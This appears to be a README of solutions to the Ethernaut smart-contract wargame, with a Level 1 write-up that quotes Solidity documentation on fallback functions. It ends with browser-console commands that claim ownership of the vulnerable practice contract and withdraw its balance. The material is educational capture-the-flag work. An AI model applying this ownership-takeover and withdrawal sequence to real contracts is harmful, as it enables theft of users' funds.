# EthernautChallenges
The following are the solutions to the Ethernaut Challenges. For a detailed walkthrough please have a look at the videos :
https://www.youtube.com/channel/UCCk-bj8IXoWDLzu7Hjf3GLQ

As mentioned in the Solidity documentation : "When deploying contracts, you should use the latest released version of Solidity. This is because breaking changes as well as new features and bug fixes are introduced regularly."
-> please try to use the latest version

Here are some useful links:
* [Nicole Zhu's Walkthrough](https://hackernoon.com/ethernaut-lvl-0-walkthrough-abis-web3-and-how-to-abuse-them-d92a8842d71b)
* [OpenZeppelin Forum](https://forum.openzeppelin.com/t/ethernaut-community-solutions/561)
* [Solidity documentation](https://solidity.readthedocs.io/en/latest/)
* [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)


#Solution:
##Level 1:
Solution:
Solidity documentation release 0.6.4 :
"A contract can have at most one fallback function, declared using fallback () external [payable] (without the function
keyword). This function cannot have arguments, cannot return anything and must have external visibility. It is  
executed on a call to the contract if none of the other functions match the given function signature, or if no data 
was supplied at all and there is no receive Ether function. The fallback function always receives data,
but in order to also receive Ether it must be marked payable." p. 99

"msg.value (uint): number of wei sent with the message" p. 73

In the case of this contract, in order to execute the fallback function we need to pass the required condition: 
require (msg.value > 0 && contributions[msg.sender] > 0)
 
Therefore, before calling the fallback function with an amount attached to it, we also need to increase our 
contributions (using the contribute() function). Once that’s done we will become the new owner of the contract. 
We can then use the withdraw() function to reduce its balance to 0.

We will solve this challenge using the following command in the console (can be access by clickin F12):
  await contract.owner()
  player
	await contract.contributions(player)
	await contract.contribute({value:1})
	await contract.contributions(player)
	await contract.sendTransaction({value:1})
	await contract.owner()
	player
	await contract.withdraw()
